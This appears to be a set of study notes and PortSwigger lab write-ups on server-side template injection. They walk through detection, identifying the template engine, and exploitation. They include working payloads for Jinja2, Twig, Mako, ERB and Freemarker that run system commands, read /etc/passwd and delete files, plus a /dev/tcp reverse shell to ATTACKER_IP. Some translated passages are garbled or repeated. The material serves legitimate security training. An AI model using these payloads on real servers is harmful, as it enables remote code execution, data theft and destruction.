# Server-side template injection


<details>
  <summary>SSTI</summary>


🚀 **What is Server-Side Template Injection (SSTI)?**

===================================================

It is a type of attack that occurs when the server uses **Template Engine** (template engine), such as:

-Jinja2 (Python)

- Twig (PHP)

- Smarty

-   Angular (server side)

- Velocity (Java)

- Freemarker



Instead of passing **data** to the template... the developer goes to a disaster operator and includes the user's **input inside the template itself**.

When this happens → any code you write inside the template will be executed **on the server**.

This means that the attacker has catastrophic power that can reach:

🔥 **Remote Code Execution (running commands on the server)**

🔥 Reading sensitive files

🔥 Dump for environment variables

🔥 Complete control of the server

---



🧨 **Why is this dangerous?**
===================

Because Template Engines do not only print text,
This allows:

- loops

- conditionals

- Access to objects

- Access files

- And some of them...run system commands!!

This means that just:

`{{ self }}`

or

`{{ config.items() }}`

He may give you confidential information.

With advanced exploitation → achieve RCE.

---

🛠️ **How ​​do you know that the site has SSTI? (Methods of discovery)**
====================================================

✔️ 1) Inject payload is simple:
--------------------------

```
{{7*7}}

${7*7}

<%= 7*7 %>

#{7*7}
```


> If score = 49 → injectable site.

---

📌 **A serious example that illustrates the tragedy**
=============================

It's supposed to do this:

```
$twig->render("Dear {{ name }}", ["name" => $_GET['name']]);
```

> ### This is safe. ✅

But if the developer wrote like this:

```
$twig->render("Dear " . $_GET['name']);
```

Here the name became part of the template → an attacker writes:

```
?name={{7*7}}
```

It will remain:

```
Dear 49
```

Hello, if the templet supports running commands:

```
{{ system('ls') }}
```

You will see all the server files 😬

---


🏴‍☠️ **Advanced Exploitation (RCE)**
=================================

Jinja2 example:


```

{{ cycler.__init__.__globals__.os.popen("id").read() }}

```

retrun

```

uid=33(www-data) gid=33(www-data)

```




  
</details>


<details>
  <summary>Constructing SSTI Attack</summary>




🎯 **General SSTI Exploitation Methodology (4 Basic Steps)**
========================================================================

PortSwigger summarizes the whole exploit in 4 steps:

1. **Detect -- detect the presence of an SSTI**

2. **Identify -- Determine the type of Template Engine**

3. **Exploit **

4. **Escalate -- Access to run /RCE commands**

In the part that PortSwigger wrote above, they focus on the first step, which is **Detect**.

I will explain it to you step by step.

* * * * *

🟦 **1) General idea: You have to look at it with your hand because it is not obvious**

============================================================

SSTI is not like XSS, it is not easily detected. Because:

-   Sometimes the server renders (generates HTML) but does not show an error.

-   Or rendered the result, but the developer did not think that it was a vulnerability.

-   Or there is exploitation inside the server that is not visible in the client.

Therefore, you should **deliberately** test that you are injecting template code.

* * * * *

🟩 **2) Fuzzing tests --- like opening a door and seeing what happens**

==================================================================

Your first step:

### 🔥 Follow popular template codes from all languages

like:

```
${{<%[%'"}}%\
```

If **Error occurs on the server** → it means that the code entered the template engine.\
This is the first indication of the presence of an SSTI.

* * * * *

🟧 **3) The context --- where exactly do you put your input?**
=======================================================

SSTI comes in **two places**:

* * * * *

🟨 **Context 1 --- Plaintext Context**
=================================================

This is a simple scenario in which user input is placed inside the plain text on the page.

Example:



```
render('Hello ' + username)
```

if you send:

```
?username=${7*7}
```

and it return:

```
Hello 49
```

This means that the server executed the expression of the template → **SSTI confirmed**.

This is more like XSS\
But instead of execution occurring in the browser → execution occurs on the server itself.

**Important point:**\
The syntax varies depending on the template engine (such as Jinja2, Twig, or Freemarker).

* * * * *

🟥 **Context 2 --- Code Context**
===============================

This is the most dangerous scenario because it is not clear at all.

The input remains inside **the template on the letter**:

example:


```
engine.render("Hello {{"+greeting+"}}", data)
```

if user send : 

```
?greeting=data.username
```

will return:

```
Hello Carlos
```

This is similar to a hashmap lookup and it does not appear to be a vulnerability.

### To reveal the vulnerability:

You need to do two steps:

* * * * *

🔹 **Step 1 --- Simple XSS Testing**
----------------------------

Send:

```
?greeting=data.username<tag>
```

To check whether `<tag>` will appear?\
if:

- Delete

-or encoded back

- Or make an error\
    There is no XSS left.

From here we move to step 2.

* * * * *

🔹 **Step 2 --- We are trying to break the template syntax**
----------------------------------------------

We add a curly bracket:

```
?greeting=data.username}}
```

Then we try adding HTML after it:

```
?greeting=data.username}}<tag>
```

Scenarios:

1️⃣ If the server made an error → incorrect syntax (try syntax again)\
2️⃣ If there is no effect → most likely there is no SSTI\
3️⃣ If `<tag>` appears in the reply →\
🔥 **So I exited the template injection and injected HTML → SSTI confirmed**

* * * * *

🟣 **A brief summary of what is important in the exam**
=========================================

✔️ SSTI occurs in two cases:
-----------------------

- Plaintext context (text + input)

- Code context (input faces template syntax)

✔️ Detection test:
----------------

- inject template syntax such as: `{{7*7}}` or `${7*7}`

- If the result is 49 → vulnerability confirmed

- If Error → also an indicator

- If HTML appears after break-out → confirmed

✔️ Code context is more dangerous because it is not visible and people can miss it.
-------------------------------------------------------


---

🟩 First: **Identify → Determine the type of Template Engine**
======================================================

After we have confirmed that there is an SSTI, we need to know:

### ❗ **Template engine used: Twig? Jinja2? Freemarker? Velocity? ERB? Mustache?**

Why is it important?\
Because **each Template Engine has a different Syntax** and without knowing the engine → you will not be able to do RCE.

* * * * *

🟦 1) **Method 1 --- Error Messages**
=========================================

You sent syntax incorrectly **intentionally** and you see the error.

For example, I followed:

```
<%= test %>
```

if server response with:

```
(erb):1: undefined local variable or method `test' for main:Object
```

🤝 Engine = ERB (Ruby).

This is the best way because the message reveals engine + version.

---

🟧 2) **The second method --- Probing Payloads**
============================================

If there are no error messages (production environment), we use the **syntax testing** method in the form:

### 🔥 I followed calculations written in every Template Engine language

And see which one works.

example:

### ❗ Jinja2:

```
{{ 7*7 }}
```

### ❗ Twig:

```
{{ 7*'7' }}
```

### ❗ Freemarker:

```
${7*7}
```

### ❗ ERB:

```
<%= 7*7 %>
```

### ❗ Velocity:

```
#foreach( $i in [1..1] )${7*7}#end
```


![image](https://gblobscdn.gitbook.com/assets%2F-L_2uGJGU7AVNRcqRvEi%2F-M7O4Hp6bOFFkge_yq4G%2F-M7OCvxwZCiaP8Whx2fi%2Fimage.png)



---

✔️ Result notes:
-----------------

Example said by PortSwigger:

Payload:

```
{{ 7 * '7' }}
```

- In **Twig** → gives **49**

- In **Jinja2** → gives `7' repeated 7 times` → **7777777**

💡 **Conclusion:**\
The same payload can work in more than one language → you must do 2-3 tests before you conclude.

---

🟩 Second: **Exploit → Exploiting the vulnerability**
=======================================

After we know the language, we start to look at:

-Variable access

- → to reading files

- → to environment access

- → to RCE

I will explain the methodology to you before we dive into payloads:

---

🟪 **1) Local variable access**
===============================

We start examining:

```
{{ variable }}
```


We see what values ​​exist - this helps us know what is available for exploitation.

* * * * *

🟪 **2) Access object fields / functions**
==========================================

We try:

```
{{config }}
{{ request }}
{{ self }}
{{ globals }}
```

If something comes up → we take advantage of it.

* * * * *


🟪 **3) File read -- LFI**
=========================

Some engines allow reading files

### Jinja2:

```
{{ cycler.__init__.__globals__.os.popen('ls').read() }}
```

### Twig:

```
{{ source('/etc/passwd') }}
```

* * * * *

🟪 **4) Remote Code Execution (RCE)**
=====================================

After accessing OS functions, we start running commands.

### Jinja2 RCE example:

```
{{ ''.__class__.__mro__[2].__subclasses__()[40]('ls',shell=True,stdout=-1).communicate() }}
```

### Twig RCE example:

Twig does not allow RCE directly.
But if misconfigured, we use Filters chaining:

```
{{ ['id']|filter('system') }}
```

* * * * *


🟪 **5) Sandbox escape**
========================

If the template engine is sandboxed, we use advanced payloads such as:

- attribute traversal

- subclass enumeration

- calling Python builtins



  
</details>






<details>
  <summary>Exploiting SSTI</summary>


✅ **Exploiting Server-Side Template Injection (SSTI) --- Conclusion**
==================================================================

After:

1. **You discover** that it has an SSTI

2. **Specifies** the type of template engine

The important part begins: **How ​​do you exploit the loophole?**

Exploitation often proceeds in 4 steps:

* * * * *

**1) Read -- Read about the Template Engine**
=========================================

The first step you take is to:

- Go to Documentation of the engine.

- You learn his basics.

for him?\
Why every Template Engine:

- different syntax,

- A different way to deal with variables,

- Way to include native code (this is what reaches RCE).

example:

### **Mako (Python)**

If you find a site that uses Mako, you can easily do RCE:**1) Read -- Read about the Template Engine**
=========================================

The first step you take is to:

- Go to Documentation of the engine.

- You learn his basics.

for him?\
Why every Template Engine:

- different syntax,

- A different way to deal with variables,

- Way to include native code (this is what reaches RCE).

example:

### **Mako (Python)**

If you find a site that uses Mako, you can easily do RCE:


```python
<%
    import os
    x=os.popen('id').read()
%>
${x}

```

This is complete Python code. The template engine will execute it and return the result to you.

---

**2) Template Syntax -- Understand Syntax**
=======================================

Before you do RCE, you need to know:

- How do you do variable injection?

- How do loops work?

- How to operate code blocks

- How to use filters?

Example of Math test inject:

- `{{7*7}}` → If you think it will be Jinja2, Twig, or something else

- `${7*7}` → It could be Velocity or Mako

- `<%= 7*7 %>` → could be ERB (Ruby)

Each engine has a specific syntax.

* * * * *

**3) Security Documentation -- Read Security Notes**
===================================================

Documentation is always in it:

- known vulnerabilities

- secure functions

- unsafe filters

- examples for sandbox escapes

example:\
Django template engine is very protected → it will probably not get you to RCE.\
Jinja2 **It is possible** to reach RCE if you can escape from the sandbox.

* * * * *

**4) Documented Exploits -- Click on Ready Exploits **
===================================================

Many template engines have exploits available on GitHub or PayloadsAllTheThings.

example:

### **Jinja2 Sandbox Escape**

```
{{ ''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read() }}
```

This payload is ready to read files.

---

🎯 **Quick example: Exploiting Jinja2**
===================================

If you find `{{7*7}} = 49` → probably Jinja2.

Start reading the files:

```
{{ self.__init__.__globals__.os.popen('ls -la').read() }}
```

Reverse shell:

```
{{ self.__init__.__globals__.os.system('bash -c "bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1"') }}
```



---


🔥 **Explanation --- Read about the security implications**
=================================================

After you specify the template engine (Jinja2 / Twig / ERB / ​​Velocity / Mako...), not only do you have to understand Syntax...\
But you must read **Security Implications** --- the part that tells you:

### ✔ Things you *cannot do*

### ✔ Things that are *dangerous if they happen*

### ✔ Things that *cause vulnerabilities*

This is very important for two reasons:

* * * * *


⭐ 1) The Security Section = Cheat Sheet for exploitation
=================================================

The documentation has hours in which there is a Section called:

-Security considerations

- Security Notes

- Sandbox Security

- Unsafe Functions

In this part, the developers write:

❗ *"Do not use function X because it may cause code execution"*\
❗ *"Avoid passing user input directly into eval tags"*

This is like a security laboratory for you = **treasure**\
for him?\
Because everything they tell you “don’t do” → is exactly what you want to do as a person trying to exploit.

* * * * *

⭐ 2) Even if there is no Security Section --- there are small warnings
=====================================================

Even if there is no full section for security, you will always find lines like:

⚠️ *This function allows access to the file system*\
⚠️ *This object can invoke OS commands*\
⚠️ *This feature is disabled by default for security reasons*

There will be signs telling you:

➡️ “Search here, this is an entry point for exploitation”

* * * * *

⭐ 3) Obvious example: ERB (Ruby Template Engine)
==========================================

The ERB documentation states that inside template\
You can use Ruby code directly.

If you use it incorrectly (via user input) → it turns into **RCE**.

Famous example:

### 📌 Listing directories + reading files using ERB:

```ruby
<%= Dir.entries('/') %>
<%= File.read('/etc/passwd') %>
```

This happens inside the template itself!

If you have an SSTI in ERB, you can do:

✔ List directories\
✔ Read files\
✔ Write files\
✔ Execute system commands

Because ERB essentially = Ruby code execution environment.

* * * * *


⭐ 4) Why is this important in exploitation?
=================================================

Because the goal in SSTI is not just to receive a message\
the goal:

🔥 File Read\
🔥 File Write\
🔥 RCE\
🔥 Shell

And the documentation tells you:

- Which classes can access the filesystem

- What functions can you use to escape from the Sandbox?

- Any built-ins are “dangerous” and connect to the OS

It literally tells you where the holes are.




































  
</details>



















































































---

# **`Labs`**


<details>
  <summary>Lab: Basic server-side template injection</summary>

1. Notice that when you try to view more details about the first product, a GET request uses the message parameter to render "Unfortunately this product is out of stock" on the home page.


<img width="1389" height="895" alt="image" src="https://github.com/user-attachments/assets/b3f1a995-14d6-4b64-8d8d-dc10088dc96a" />

```
https://0a2500e404f1d461a370157f00c50073.web-security-academy.net/?message=Unfortunately%20this%20product%20is%20out%20of%20stock
```

2. try :

```
https://0a2500e404f1d461a370157f00c50073.web-security-academy.net/?message={{7*7}}
```

> but not work 



```
https://0a2500e404f1d461a370157f00c50073.web-security-academy.net/?message=<%= 7*7 %>
```

<img width="1127" height="709" alt="image" src="https://github.com/user-attachments/assets/a6d24433-6067-48a7-aaed-98ab9a7b6c2f" />

> ## so the server work with **`ERB`**

> ## now after some search about **`erb - documentation`** try to remove **`/home/carlos/morale.txt`**


```ruby
<%= system("rm /home/carlos/morale.txt") %>
```


<img width="1708" height="707" alt="image" src="https://github.com/user-attachments/assets/747eb921-fe0b-43d5-8cbe-5e7fe18d6136" />








  
</details>








<details>
  <summary>Lab: Basic server-side template injection (code context)</summary>


<img width="1439" height="670" alt="image" src="https://github.com/user-attachments/assets/5a7ec24a-ec17-46d5-86d4-c1486f13f1e0" />


<img width="756" height="411" alt="image" src="https://github.com/user-attachments/assets/5bb382e2-99b6-4ac0-9e8b-495881b51999" />


1. try to test for inject :

```
blog-post-author-display=user.first_name}}{{7*7}}&csrf=3QvIuQXt8JzbYFrzruppxYCwA8AgnyJh
```

<img width="739" height="481" alt="image" src="https://github.com/user-attachments/assets/2cddb163-cc43-4b4f-ae88-afc40188efc6" />


see the comment

<img width="565" height="238" alt="image" src="https://github.com/user-attachments/assets/6ba50ccc-f39d-420e-899d-dd1451a9b17c" />

> ## now try to reomve the file


```
{% import os %}
{{os.system('rm /home/carlos/morale.txt')
```

```
blog-post-author-display=user.first_name}}{%25+import+os+%25}{{os.system('rm%20/home/carlos/morale.txt')
```

> now write any comment and lab will be solved

<img width="1315" height="492" alt="image" src="https://github.com/user-attachments/assets/5a95b579-b87e-48f9-9a7c-0a9dd028138d" />


  
</details>




<details>
   <summary>Lab: Server-side template injection using documentation</summary>


## [Restriction bypass using ?lower_abc function](https://www.synack.com/exploits-explained/exploits-explained-discovering-a-server-side-template-injection-vuln-in-freemarker/) ✨👑


```
${"freemarker.template.utility.Execute"?new()("rm /home/carlos/morale.txt")}
```


<img width="1184" height="521" alt="image" src="https://github.com/user-attachments/assets/259ac013-aabd-4e7f-aa58-e62b4fd245a9" />



  
</details>

























